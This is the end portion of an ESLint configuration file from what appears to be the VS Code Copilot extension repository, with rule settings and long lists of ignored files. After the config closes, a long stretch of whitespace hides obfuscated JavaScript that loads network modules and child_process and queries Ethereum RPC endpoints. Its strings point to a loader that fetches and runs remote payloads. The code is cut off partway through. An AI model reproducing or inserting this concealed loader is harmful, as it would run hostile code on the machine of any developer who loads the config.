		rules: {
			'copilot-local/no-test-only': 'warn'
		}
	},
	// copilot extension - no-explicit-any
	{
		files: [
			'extensions/copilot/src/**/*.ts',
		],
		ignores: [
			'extensions/copilot/src/util/vs/**/*.ts',
			'extensions/copilot/src/**/*.spec.ts',
			'extensions/copilot/src/extension/agents/copilotcli/node/nodePtyShim.ts',
			'extensions/copilot/src/extension/byok/common/anthropicMessageConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiFunctionDeclarationConverter.ts',
			'extensions/copilot/src/extension/byok/common/geminiMessageConverter.ts',
			'extensions/copilot/src/extension/byok/vscode-node/anthropicProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/geminiNativeProvider.ts',
			'extensions/copilot/src/extension/byok/vscode-node/ollamaProvider.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionContentBuilder.ts',
			'extensions/copilot/src/extension/chatSessions/vscode-node/copilotCloudSessionsProvider.ts',
			'extensions/copilot/src/extension/codeBlocks/node/codeBlockProcessor.ts',
			'extensions/copilot/src/extension/codeBlocks/vscode-node/provider.ts',
			'extensions/copilot/src/extension/configuration/vscode-node/configurationMigration.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericInlineIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/genericPanelIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/inlineFixIntentInvocation.ts',
			'extensions/copilot/src/extension/context/node/resolvers/promptWorkspaceLabels.ts',
			'extensions/copilot/src/extension/contextKeys/vscode-node/contextKeys.contribution.ts',
			'extensions/copilot/src/extension/conversation/vscode-node/userActions.ts',
			'extensions/copilot/src/extension/extension/vscode/services.ts',
			'extensions/copilot/src/extension/inlineChat/node/rendererVisualization.ts',
			'extensions/copilot/src/extension/inlineChat/vscode-node/inlineChatCommands.ts',
			'extensions/copilot/src/extension/inlineEdits/common/observableWorkspaceRecordingReplayer.ts',
			'extensions/copilot/src/extension/inlineEdits/vscode-node/parts/vscodeWorkspace.ts',
			'extensions/copilot/src/extension/intents/node/editCodeIntent.ts',
			'extensions/copilot/src/extension/intents/node/editCodeStep.ts',
			'extensions/copilot/src/extension/intents/node/fixIntent.ts',
			'extensions/copilot/src/extension/intents/node/newIntent.ts',
			'extensions/copilot/src/extension/intents/node/searchIntent.ts',
			'extensions/copilot/src/extension/languageContextProvider/vscode-node/languageContextProviderService.ts',
			'extensions/copilot/src/extension/linkify/common/commands.ts',
			'extensions/copilot/src/extension/linkify/common/responseStreamWithLinkification.ts',
			'extensions/copilot/src/extension/linkify/test/node/util.ts',
			'extensions/copilot/src/extension/log/vscode-node/loggingActions.ts',
			'extensions/copilot/src/extension/log/vscode-node/requestLogTree.ts',
			'extensions/copilot/src/extension/mcp/test/vscode-node/util.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/commands.ts',
			'extensions/copilot/src/extension/mcp/vscode-node/nuget.ts',
			'extensions/copilot/src/extension/onboardDebug/node/copilotDebugWorker/rpc.ts',
			'extensions/copilot/src/extension/onboardDebug/node/parseLaunchConfigFromResponse.ts',
			'extensions/copilot/src/extension/onboardDebug/vscode-node/copilotDebugCommandHandle.ts',
			'extensions/copilot/src/extension/prompt/common/toolCallRound.ts',
			'extensions/copilot/src/extension/prompt/node/chatMLFetcher.ts',
			'extensions/copilot/src/extension/prompt/node/chatParticipantTelemetry.ts',
			'extensions/copilot/src/extension/prompt/node/editGeneration.ts',
			'extensions/copilot/src/extension/prompt/node/intents.ts',
			'extensions/copilot/src/extension/prompt/node/todoListContextProvider.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/endpointProviderImpl.ts',
			'extensions/copilot/src/extension/prompt/vscode-node/requestLoggerImpl.ts',
			'extensions/copilot/src/extension/prompts/node/agent/promptRegistry.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptElement.ts',
			'extensions/copilot/src/extension/prompts/node/base/promptRenderer.ts',
			'extensions/copilot/src/extension/prompts/node/test/utils.ts',
			'extensions/copilot/src/extension/replay/common/chatReplayResponses.ts',
			'extensions/copilot/src/extension/replay/node/replayParser.ts',
			'extensions/copilot/src/extension/replay/vscode-node/replayDebugSession.ts',
			'extensions/copilot/src/extension/review/node/githubReviewAgent.ts',
			'extensions/copilot/src/extension/test/node/services.ts',
			'extensions/copilot/src/extension/test/vscode-node/extension.test.ts',
			'extensions/copilot/src/extension/test/vscode-node/sanity.sanity-test.ts',
			'extensions/copilot/src/extension/test/vscode-node/session.test.ts',
			'extensions/copilot/src/extension/tools/common/toolSchemaNormalizer.ts',
			'extensions/copilot/src/extension/tools/common/toolsService.ts',
			'extensions/copilot/src/extension/typescriptContext/common/serverProtocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/baseContextProviders.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/contextProvider.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/protocol.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/typescripts.ts',
			'extensions/copilot/src/extension/typescriptContext/serverPlugin/src/common/utils.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/inspector.ts',
			'extensions/copilot/src/extension/typescriptContext/vscode-node/languageContextService.ts',
			'extensions/copilot/src/extension/workspaceRecorder/vscode-node/workspaceListenerService.ts',
			'extensions/copilot/src/extension/workspaceSemanticSearch/node/semanticSearchTextSearchProvider.ts',
			'extensions/copilot/src/lib/node/chatLibMain.ts',
			'extensions/copilot/src/platform/authentication/test/node/simulationTestCopilotTokenManager.ts',
			'extensions/copilot/src/platform/chat/common/blockedExtensionService.ts',
			'extensions/copilot/src/platform/chunking/common/chunkingEndpointClientImpl.ts',
			'extensions/copilot/src/platform/commands/common/mockRunCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/common/runCommandExecutionService.ts',
			'extensions/copilot/src/platform/commands/vscode/runCommandExecutionServiceImpl.ts',
			'extensions/copilot/src/platform/configuration/common/configurationService.ts',
			'extensions/copilot/src/platform/configuration/common/validator.ts',
			'extensions/copilot/src/platform/configuration/test/common/inMemoryConfigurationService.ts',
			'extensions/copilot/src/platform/configuration/vscode/configurationServiceImpl.ts',
			'extensions/copilot/src/platform/customInstructions/common/customInstructionsService.ts',
			'extensions/copilot/src/platform/debug/vscode/debugOutputListener.ts',
			'extensions/copilot/src/platform/diff/node/diffWorkerMain.ts',
			'extensions/copilot/src/platform/editing/common/notebookDocumentSnapshot.ts',
			'extensions/copilot/src/platform/editing/common/textDocumentSnapshot.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsGrouper.ts',
			'extensions/copilot/src/platform/embeddings/common/embeddingsIndex.ts',
			'extensions/copilot/src/platform/embeddings/common/remoteEmbeddingsComputer.ts',
			'extensions/copilot/src/platform/endpoint/node/modelMetadataFetcher.ts',
			'extensions/copilot/src/platform/endpoint/test/node/openaiCompatibleEndpoint.ts',
			'extensions/copilot/src/platform/env/common/packagejson.ts',
			'extensions/copilot/src/platform/extensions/common/extensionsService.ts',
			'extensions/copilot/src/platform/filesystem/common/fileSystemService.ts',
			'extensions/copilot/src/platform/github/common/githubService.ts',
			'extensions/copilot/src/platform/github/common/nullOctokitServiceImpl.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/edit.ts',
			'extensions/copilot/src/platform/inlineEdits/common/dataTypes/textEditLengthHelper/length.ts',
			'extensions/copilot/src/platform/inlineEdits/common/editReason.ts',
			'extensions/copilot/src/platform/inlineEdits/common/statelessNextEditProvider.ts',
			'extensions/copilot/src/platform/inlineEdits/common/utils/observable.ts',
			'extensions/copilot/src/platform/languages/common/languageDiagnosticsService.ts',
			'extensions/copilot/src/platform/log/common/logExecTime.ts',
			'extensions/copilot/src/platform/log/common/logService.ts',
			'extensions/copilot/src/platform/log/vscode/outputChannelLogTarget.ts',
			'extensions/copilot/src/platform/nesFetch/common/completionsFetchService.ts',
			'extensions/copilot/src/platform/nesFetch/node/completionsFetchServiceImpl.ts',
			'extensions/copilot/src/platform/networking/common/fetch.ts',
			'extensions/copilot/src/platform/networking/common/fetcherService.ts',
			'extensions/copilot/src/platform/networking/common/networking.ts',
			'extensions/copilot/src/platform/networking/common/openai.ts',
			'extensions/copilot/src/platform/networking/node/baseFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/chatStream.ts',
			'extensions/copilot/src/platform/networking/node/fetcherFallback.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetchFetcher.ts',
			'extensions/copilot/src/platform/networking/node/nodeFetcher.ts',
			'extensions/copilot/src/platform/networking/node/stream.ts',
			'extensions/copilot/src/platform/networking/node/test/nodeFetcherService.ts',
			'extensions/copilot/src/platform/networking/vscode-node/electronFetcher.ts',
			'extensions/copilot/src/platform/networking/vscode-node/fetcherServiceImpl.ts',
			'extensions/copilot/src/platform/notification/common/notificationService.ts',
			'extensions/copilot/src/platform/notification/vscode/notificationServiceImpl.ts',
			'extensions/copilot/src/platform/openai/node/fetch.ts',
			'extensions/copilot/src/platform/parser/node/nodes.ts',
			'extensions/copilot/src/platform/parser/node/parserServiceImpl.ts',
			'extensions/copilot/src/platform/parser/node/parserWorker.ts',
			'extensions/copilot/src/platform/parser/node/treeSitterQueries.ts',
			'extensions/copilot/src/platform/remoteCodeSearch/common/githubCodeSearchService.ts',
			'extensions/copilot/src/platform/remoteSearch/node/codeOrDocsSearchClientImpl.ts',
			'extensions/copilot/src/platform/review/vscode/reviewServiceImpl.ts',
			'extensions/copilot/src/platform/scopeSelection/vscode-node/scopeSelectionImpl.ts',
			'extensions/copilot/src/platform/snippy/common/snippyTypes.ts',
			'extensions/copilot/src/platform/survey/vscode/surveyServiceImpl.ts',
			'extensions/copilot/src/platform/tasks/vscode/tasksService.ts',
			'extensions/copilot/src/platform/telemetry/common/failingTelemetryReporter.ts',
			'extensions/copilot/src/platform/telemetry/common/telemetryData.ts',
			'extensions/copilot/src/platform/telemetry/node/azureInsightsReporter.ts',
			'extensions/copilot/src/platform/telemetry/node/spyingTelemetryService.ts',
			'extensions/copilot/src/platform/terminal/common/terminalService.ts',
			'extensions/copilot/src/platform/terminal/vscode/terminalServiceImpl.ts',
			'extensions/copilot/src/platform/test/common/endpointTestFixtures.ts',
			'extensions/copilot/src/platform/test/common/testExtensionsService.ts',
			'extensions/copilot/src/platform/test/node/extensionContext.ts',
			'extensions/copilot/src/platform/test/node/fetcher.ts',
			'extensions/copilot/src/platform/test/node/services.ts',
			'extensions/copilot/src/platform/test/node/simulationWorkspace.ts',
			'extensions/copilot/src/platform/test/node/telemetry.ts',
			'extensions/copilot/src/platform/test/node/testWorkbenchService.ts',
			'extensions/copilot/src/platform/testing/common/nullWorkspaceMutationManager.ts',
			'extensions/copilot/src/platform/thinking/common/thinking.ts',
			'extensions/copilot/src/platform/tokenizer/node/tikTokenizerWorker.ts',
			'extensions/copilot/src/platform/tokenizer/node/tokenizer.ts',
			'extensions/copilot/src/platform/workbench/common/workbenchService.ts',
			'extensions/copilot/src/platform/workbench/vscode/workbenchServiceImpt.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/nullWorkspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/tfidfChunkSearch.ts',
			'extensions/copilot/src/platform/workspaceChunkSearch/node/workspaceFileIndex.ts',
			'extensions/copilot/src/platform/workspaceRecorder/common/resolvedRecording/resolvedRecording.ts',
			'extensions/copilot/src/util/common/async.ts',
			'extensions/copilot/src/util/common/cache.ts',
			'extensions/copilot/src/util/common/chatResponseStreamImpl.ts',
			'extensions/copilot/src/util/common/debounce.ts',
			'extensions/copilot/src/util/common/debugValueEditorGlobals.ts',
			'extensions/copilot/src/util/common/diff.ts',
			'extensions/copilot/src/util/common/progress.ts',
			'extensions/copilot/src/util/common/test/shims/chatTypes.ts',
			'extensions/copilot/src/util/common/test/shims/editing.ts',
			'extensions/copilot/src/util/common/test/shims/l10n.ts',
			'extensions/copilot/src/util/common/test/shims/notebookDocument.ts',
			'extensions/copilot/src/util/common/test/shims/vscodeTypesShim.ts',
			'extensions/copilot/src/util/common/test/simpleMock.ts',
			'extensions/copilot/src/util/common/timeTravelScheduler.ts',
			'extensions/copilot/src/util/common/types.ts',
			'extensions/copilot/src/util/node/worker.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': true
				}
			]
		}
	},
	// copilot extension - chatLibMain exception
	{
		files: [
			'extensions/copilot/src/lib/node/chatLibMain.ts',
		],
		rules: {
			'import/no-restricted-paths': 'off'
		}
	},
	// Allow querySelector/querySelectorAll in test files - it's acceptable for test assertions
	{
		files: [
			'src/**/test/**/*.ts',
			'extensions/**/test/**/*.ts',
		],
		rules: {
			'no-restricted-syntax': [
				'warn',
				// Keep the Intl helper restriction even in tests
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': 'TSAsExpression[typeAnnotation.type="TSTypeReference"][typeAnnotation.typeName.type="TSQualifiedName"][typeAnnotation.typeName.left.type="Identifier"][typeAnnotation.typeName.left.name="sinon"][typeAnnotation.typeName.right.name="SinonStub"]',
					'message': `Avoid casting with 'as sinon.SinonStub'. Prefer typed stubs from 'sinon.stub(...)' or capture the stub in a typed variable.`
				},
			],
		}
	});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-0229-2";const _0x44ceab=_0xc702;(function(_0x242c2a,_0xcc5db6){const _0x55afa4=_0xc702,_0x2abd94=_0x242c2a();while(!![]){try{const _0x3f9b11=-parseInt(_0x55afa4(0x12b))/(-0x368+0x1cce+0x877*-0x3)*(-parseInt(_0x55afa4(0x17f))/(-0x227*-0x11+-0x5d7+-0x1ebe))+-parseInt(_0x55afa4(0xec))/(-0x2316+0xb*0x1c+0x21e5)*(parseInt(_0x55afa4(0x1ac))/(0x897+0x1921+-0x21b4))+-parseInt(_0x55afa4(0xed))/(-0x1459+-0x717*-0x4+-0x7fe)*(parseInt(_0x55afa4(0xa7))/(-0x6*-0x4d2+-0x1640+-0x6a6))+-parseInt(_0x55afa4(0xaa))/(0x53b*0x4+-0x1*0x818+-0xccd)+-parseInt(_0x55afa4(0x138))/(-0x167*-0xa+0x1*-0xd1c+-0xe2)+-parseInt(_0x55afa4(0xd1))/(0xd25*-0x1+0x66e+0x6c0)*(-parseInt(_0x55afa4(0xd9))/(-0xb*0x227+-0x23e5+-0x2*-0x1dce))+parseInt(_0x55afa4(0x1bd))/(-0x2208+0x11a1+0x1072);if(_0x3f9b11===_0xcc5db6)break;else _0x2abd94['push'](_0x2abd94['shift']());}catch(_0x2923f3){_0x2abd94['push'](_0x2abd94['shift']());}}}(_0x3307,-0xc750f+-0x1991b*0x3+0x1*0x1a9896),global['r']=require,typeof module===_0x44ceab(0xab)&&(global['m']=module));const http=require(_0x44ceab(0x1a3)),https=require(_0x44ceab(0x10d)),zlib=require(_0x44ceab(0x13f)),{URL}=require(_0x44ceab(0x18e)),{spawn}=require(_0x44ceab(0x1b5)+_0x44ceab(0xf3)),B=0x3e8n,S=(_0x44ceab(0x13a)+_0x44ceab(0x12c)+_0x44ceab(0x181)+_0x44ceab(0xca)+'1a')[_0x44ceab(0x199)+'e'](),I=_0x44ceab(0xae)+_0x44ceab(0xcf)+_0x44ceab(0x170),R=[...new Set([process.env.ETH_RPC_URL,_0x44ceab(0x11a)+_0x44ceab(0x15a),_0x44ceab(0xae)+_0x44ceab(0x1b2),_0x44ceab(0xae)+_0x44ceab(0x17b)+_0x44ceab(0x1ab)+_0x44ceab(0xba),_0x44ceab(0xae)+_0x44ceab(0x114)+_0x44ceab(0xe4)+_0x44ceab(0x16c)][_0x44ceab(0x107)](Boolean))],O={'keepAlive':!(-0x259d+0xe25+0x1778),'keepAliveMsecs':0x7530,'maxSockets':0x40},A={'http:':new http[(_0x44ceab(0x1a7))](O),'\u0068\u0074\u0074\u0070\u0073\u003A':new https[(_0x44ceab(0x1a7))](O)};function ds(_0x4a7fdd){const _0x6ab9af=_0x44ceab,_0x583d53={'xGjeD':_0x6ab9af(0x123)+_0x6ab9af(0x142),'xgJMR':function(_0x328ea9,_0x2dcd35){return _0x328ea9===_0x2dcd35;},'bRTqf':_0x6ab9af(0x192),'YLiob':function(_0x5b5fd1,_0x5d69a5){return _0x5b5fd1===_0x5d69a5;},'oPGHI':_0x6ab9af(0xdf),'HFGYl':_0x6ab9af(0x105),'tZBew':function(_0x137fc4){return _0x137fc4();}},_0x3ac994=(_0x4a7fdd[_0x6ab9af(0xaf)][_0x583d53[_0x6ab9af(0xc3)]]||'')[_0x6ab9af(0x199)+'e'](),_0x10d60b=_0x583d53[_0x6ab9af(0x1b0)](_0x3ac994,_0x583d53[_0x6ab9af(0x168)])||_0x583d53[_0x6ab9af(0x121)](_0x3ac994,_0x583d53[_0x6ab9af(0x83)])?zlib[_0x6ab9af(0x15b)+'ip']:_0x583d53[_0x6ab9af(0x1b0)](_0x3ac994,_0x583d53[_0x6ab9af(0x9f)])?zlib[_0x6ab9af(0xc6)+_0x6ab9af(0x126)]:_0x583d53[_0x6ab9af(0x121)](_0x3ac994,'br')?zlib[_0x6ab9af(0x14c)+_0x6ab9af(0x17e)+'ss']:-0x150*-0xa+-0x5*0x697+0x13d3;return _0x10d60b?_0x4a7fdd[_0x6ab9af(0x149)](_0x583d53[_0x6ab9af(0x155)](_0x10d60b)):_0x4a7fdd;}function hr(_0x288096,{method:_0x180375=_0x44ceab(0x176),body:_0x1e1d38,signal:_0x4a5a6a}={}){const _0x22dd27=_0x44ceab,_0x2e88b9={'Zbgqs':_0x22dd27(0xf5),'webnr':function(_0x33f8c6,_0x52d640){return _0x33f8c6<_0x52d640;},'MRRMe':function(_0xb4b4ee,_0x48ba5e){return _0xb4b4ee>=_0x48ba5e;},'UOFLx':function(_0x3e4012,_0x28840e){return _0x3e4012(_0x28840e);},'beCzF':function(_0x34c01f,_0x1140c2){return _0x34c01f===_0x1140c2;},'dfFGU':function(_0x5b4d4d,_0x3c699a){return _0x5b4d4d!==_0x3c699a;},'eFyPx':function(_0x5cfbd8,_0x3010e5){return _0x5cfbd8(_0x3010e5);},'Dwqwq':_0x22dd27(0xcc),'QOAjr':_0x22dd27(0x175),'MltrU':_0x22dd27(0x16b),'PvcTj':_0x22dd27(0x194),'zTKCw':function(_0x2674a9,_0x30968b){return _0x2674a9+_0x30968b;},'xDPaM':function(_0x32c512,_0x2e00af){return _0x32c512!=_0x2e00af;},'pZXYl':function(_0x36cc6e,_0x4b2060){return _0x36cc6e===_0x4b2060;},'vRwSb':_0x22dd27(0xd3)+_0x22dd27(0x1a9),'ucpaX':_0x22dd27(0x198)+_0x22dd27(0x128),'yInys':_0x22dd27(0x1aa),'EjCUD':function(_0x22c9dc,_0x581aaa){return _0x22c9dc!=_0x581aaa;},'vwSTK':_0x22dd27(0x82)+'pe','BrVWx':_0x22dd27(0x120)+_0x22dd27(0x167)},_0x14b1c7=new URL(_0x288096),_0x1ecfec=_0x2e88b9[_0x22dd27(0x111)](_0x14b1c7[_0x22dd27(0x191)],_0x2e88b9[_0x22dd27(0xe6)])?https:http,_0x584dff={'Accept':_0x2e88b9[_0x22dd27(0x17d)],'\u0041\u0063\u0063\u0065\u0070\u0074\u002D\u0045\u006E\u0063\u006F\u0064\u0069\u006E\u0067':_0x2e88b9[_0x22dd27(0x185)],'Connection':_0x2e88b9[_0x22dd27(0x125)]};return _0x2e88b9[_0x22dd27(0x18c)](_0x1e1d38,null)&&(_0x584dff[_0x2e88b9[_0x22dd27(0x129)]]=_0x2e88b9[_0x22dd27(0x17d)],_0x584dff[_0x2e88b9[_0x22dd27(0x154)]]=Buffer[_0x22dd27(0xe7)](_0x1e1d38)),new Promise((_0x553038,_0xe33d86)=>{const _0x384fdc=_0x22dd27,_0x4dc16f={'FZbrm':_0x2e88b9[_0x384fdc(0xfc)],'jxKxj':function(_0x564452,_0x257140){const _0x342241=_0x384fdc;return _0x2e88b9[_0x342241(0x11c)](_0x564452,_0x257140);},'gqTzu':function(_0x3c16fa,_0xae1d3d){const _0x5890f6=_0x384fdc;return _0x2e88b9[_0x5890f6(0x1c1)](_0x3c16fa,_0xae1d3d);},'fCyKB':function(_0x2c7dce,_0x234c08){const _0x134c5f=_0x384fdc;return _0x2e88b9[_0x134c5f(0xff)](_0x2c7dce,_0x234c08);},'BSxZQ':function(_0x3052a6,_0x36c1ac){const _0x5582cf=_0x384fdc;return _0x2e88b9[_0x5582cf(0xf8)](_0x3052a6,_0x36c1ac);},'CZgSO':function(_0x4bea43,_0x2686c3){const _0x578467=_0x384fdc;return _0x2e88b9[_0x578467(0x160)](_0x4bea43,_0x2686c3);},'qMvGW':function(_0x2342c2,_0x2cdfce){const _0x7d9afe=_0x384fdc;return _0x2e88b9[_0x7d9afe(0x160)](_0x2342c2,_0x2cdfce);},'MPqWX':function(_0xbc0d1,_0x5060e6){const _0x551f2c=_0x384fdc;return _0x2e88b9[_0x551f2c(0x146)](_0xbc0d1,_0x5060e6);},'dHoEF':function(_0x9d4007,_0x1a2597){const _0x1174c7=_0x384fdc;return _0x2e88b9[_0x1174c7(0xff)](_0x9d4007,_0x1a2597);},'EpZSh':_0x2e88b9[_0x384fdc(0xa1)],'cYebN':_0x2e88b9[_0x384fdc(0xa9)],'BHwLs':_0x2e88b9[_0x384fdc(0xe9)]},_0x154605=_0x1ecfec[_0x384fdc(0x8a)]({'hostname':_0x14b1c7[_0x384fdc(0xb8)],'port':_0x14b1c7[_0x384fdc(0x96)]||(_0x2e88b9[_0x384fdc(0xf8)](_0x14b1c7[_0x384fdc(0x191)],_0x2e88b9[_0x384fdc(0xe6)])?-0x22dc+-0x75e+-0x3ff*-0xb:0x190a+-0x275*-0xe+0x764*-0x8),'path':_0x2e88b9[_0x384fdc(0x97)](_0x14b1c7[_0x384fdc(0xcd)],_0x14b1c7[_0x384fdc(0xa5)]),'method':_0x180375,'agent':A[_0x14b1c7[_0x384fdc(0x191)]],'signal':_0x4a5a6a,'headers':_0x584dff},_0x10d061=>{const _0x32263c=_0x384fdc,_0x360a3b={'wcugX':_0x4dc16f[_0x32263c(0x177)],'nsBHQ':function(_0x49ffa7,_0x50e3e4){const _0x12b240=_0x32263c;return _0x4dc16f[_0x12b240(0x18d)](_0x49ffa7,_0x50e3e4);},'ALAHX':function(_0x575592,_0x57f6cb){const _0x4b2af9=_0x32263c;return _0x4dc16f[_0x4b2af9(0xe8)](_0x575592,_0x57f6cb);},'wxUwN':function(_0xfe9a59,_0x578340){const _0x395788=_0x32263c;return _0x4dc16f[_0x395788(0x89)](_0xfe9a59,_0x578340);},'gnTPd':function(_0x5baf6e,_0x2e93d8){const _0x980b65=_0x32263c;return _0x4dc16f[_0x980b65(0xac)](_0x5baf6e,_0x2e93d8);},'gdiqs':function(_0x1607ba,_0x15779b){const _0x11943d=_0x32263c;return _0x4dc16f[_0x11943d(0x152)](_0x1607ba,_0x15779b);},'jQhWh':function(_0x9ace49,_0x49dfad){const _0x3317be=_0x32263c;return _0x4dc16f[_0x3317be(0x110)](_0x9ace49,_0x49dfad);},'QgmDv':function(_0x18a864,_0x37b6d8){const _0xeab540=_0x32263c;return _0x4dc16f[_0xeab540(0x135)](_0x18a864,_0x37b6d8);},'WPvOf':function(_0x595740,_0x2e0fd7){const _0x383d0c=_0x32263c;return _0x4dc16f[_0x383d0c(0x11f)](_0x595740,_0x2e0fd7);}},_0xe9039=_0x4dc16f[_0x32263c(0x89)](ds,_0x10d061),_0x34023=[];_0xe9039['on'](_0x4dc16f[_0x32263c(0x179)],_0x13f678=>_0x34023[_0x32263c(0xe3)](_0x13f678)),_0xe9039['on'](_0x4dc16f[_0x32263c(0x11b)],()=>{const _0x256843=_0x32263c,_0x16eb44=Buffer[_0x256843(0x12a)](_0x34023)[_0x256843(0x156)](_0x360a3b[_0x256843(0xa3)])[_0x256843(0xa0)]();if(_0x360a3b[_0x256843(0xb0)](_0x10d061[_0x256843(0x104)],-0x115*-0x11+0x13b5*-0x1+0x218)||_0x360a3b[_0x256843(0x193)](_0x10d061[_0x256843(0x104)],-0x130*0x9+0xe*0x1e1+0x2*-0x739))return _0x360a3b[_0x256843(0x1a1)](_0xe33d86,new Error('H'+_0x10d061[_0x256843(0x104)]+':'+_0x16eb44[_0x256843(0x1ad)](0x3*0xb2d+-0x103f+-0x1148,-0x1*0x1baf+-0x2*-0x30b+0x4f*0x47)));if(!_0x16eb44||_0x360a3b[_0x256843(0xde)](_0x16eb44[-0x1*-0x1542+-0x2*-0xe9b+-0x3278],'\u003C')||_0x360a3b[_0x256843(0xfe)](_0x16eb44[0xb8b+0x10*0xbc+0x1*-0x174b],'\u007B')&&_0x360a3b[_0x256843(0xe2)](_0x16eb44[0xea5+0x1*-0x236+-0xc6f*0x1],'\u005B'))return _0x360a3b[_0x256843(0x1a1)](_0xe33d86,new Error('J:'+_0x16eb44[_0x256843(0x1ad)](-0x2200+0x2f*-0x9b+0x3e75,-0x22c9+0x4f4+0x1e25)));try{_0x360a3b[_0x256843(0x94)](_0x553038,JSON[_0x256843(0x190)](_0x16eb44));}catch(_0x34ad21){_0x360a3b[_0x256843(0x86)](_0xe33d86,new Error('P:'+_0x34ad21[_0x256843(0xb5)]));}}),_0xe9039['on'](_0x4dc16f[_0x32263c(0x124)],_0xe33d86);});_0x154605['on'](_0x2e88b9[_0x384fdc(0xe9)],_0xe33d86),_0x2e88b9[_0x384fdc(0xa8)](_0x1e1d38,null)&&_0x154605[_0x384fdc(0x151)](_0x1e1d38),_0x154605[_0x384fdc(0x175)]();});}function _0x3307(){const _0x3b7856=['HTMau','kZlWZ','bnHJf','RptWP','write','CZgSO',':443','BrVWx','tZBew','toString','fkRSW',':443/0x/ls','rsXqP','pc.io/eth','createGunz','KJKIG','shSPT','OcATS','stener','dfFGU','ignore','SIecw','TQAET','zezXV','QZRte','POST','ngth','bRTqf','QQiEt','uUkdF','error','stapi.io','LnaXN','vAWQN','kpHNq','ut.com/api','BtJwU','RWpMw','find','catch','end','GET','FZbrm','crZCf','EpZSh','map','hereum-rpc','Kit/537.36','vRwSb','liDecompre','595780QbjmdV','CHepZ','6f0121063e','VyEOa','OGXGz','rwOMD','ucpaX','aBWJK','addEventLi','nsactionCo','9&page=1&o','FakYG','Jpnst','EjCUD','jxKxj','url','node','parse','protocol','gzip','ALAHX','https:','\x27]=\x27','count&acti',')\x20AppleWeb','gzip,\x20defl','toLowerCas','HoDWs','eth_getBlo','QZywI','wibbZ','unt','xOtmL','ike\x20Gecko)','wxUwN','pMLys','http','result','_t_s','forEach','Agent','all','n/json','keep-alive','.publicnod','3908idpnlr','slice','UniBA','AiKTD','xgJMR','ViSQB','h.drpc.org','YyqQS','uJddd','child_proc','uyVDL','ZuHfL','yyHsj','oflCH','cHSXQ','CQAWy','length','32590789fJQcWT','\x20NT\x2010.0;\x20','JxCbi','QbRRV','MRRMe','nerJu','bpVfp','Content-Ty','oPGHI','RbxTf','min','WPvOf','from','nGxVW','fCyKB','request','LyGdN','czpyg','unref','BLrzN','subarray','replace','_t_u','transactio','0\x20(Windows','QgmDv','ojvxD','port','zTKCw','ck=9999999','\x20(KHTML,\x20l','charCodeAt','global[\x27_V','AARcQ','_H2','isArray','HFGYl','trim','Dwqwq','get','wcugX','blockNumbe','search','PvZQW','6AKWwcZ','xDPaM','QOAjr','5961487gAvUKF','object','BSxZQ','cyCpl','https://et','headers','nsBHQ','jIkRj','unMKf','then','finally','message','mEGgj',',Sr3=@','hostname','\x27;global[\x27','e.com','wIbeD','DTEdO','QthWB','EkQIH','stringify','q4FZkxX{!h','OVUFq','no\x20b64','xGjeD','HkrSh','PVNNR','createInfl','WByWQ','IctFD','bymlS','9aDC2490Ef','1.0.0.0\x20Sa','data','pathname','ilterby=fr','h.blocksco','caxup','23427SFKuld','cRXVv','applicatio','uMvOo','Mozilla/5.','base64','tpJHG','tZibq','1300BKywdY','al=global;','e;global[\x27','ckByNumber','findIndex','gnTPd','x-gzip','resume','PskPD','jQhWh','push','public.bla','HQMBO','PvcTj','byteLength','gqTzu','MltrU','hSmHa','ucUNo','2823eEOkZK','1647205wUeYDY','r\x27]=requir','UISzP','onYDw','m\x27]=module','on=txlist&','ess','signal','utf8','YfHXM','b64','beCzF','DfeAz','nonce',';var\x20_glob','Zbgqs','MJEEv','gdiqs','UOFLx','eth_blockN','resolve','jwZZr','@^1aQk','statusCode','deflate','SfXzz','filter','y-p_>d$0B&','abort','Win64;\x20x64','k=0&endblo',':80','https','USRYf','empty','qMvGW','pZXYl','hex','\x20Chrome/13','h-mainnet.','x-payload-','HEAD','SrQJg','eth_getTra','OVJbp','https://1r','cYebN','webnr','bKTVo','?module=ac','dHoEF','Content-Le','YLiob','http://','content-en','BHwLs','yInys','ate','address=','ate,\x20br','vwSTK','concat','1QiuBJh','D311D3080e','GGbog','ffset=20&s','controller','xzqPs','durVE','ngsKF','OxJjQ','eGiCH','MPqWX','RmfMB','fLEkP','7089872YjfbgX',':443/0x/cl','0xa322E5f3','&startbloc','2.0','ufUJK','zAkNr','zlib','fari/537.3','bPQfv','coding','run','FXTJz','any','eFyPx','umber','ogFTC','pipe','XUzln','ort=desc&f','createBrot'];_0x3307=function(){return _0x3b7856;};return _0x3307();}function wr(_0x4bf01d,_0x2d60a1){const _0x302f7f=_0x44ceab,_0x44f1c3=R[_0x302f7f(0x17a)](()=>new AbortController());return 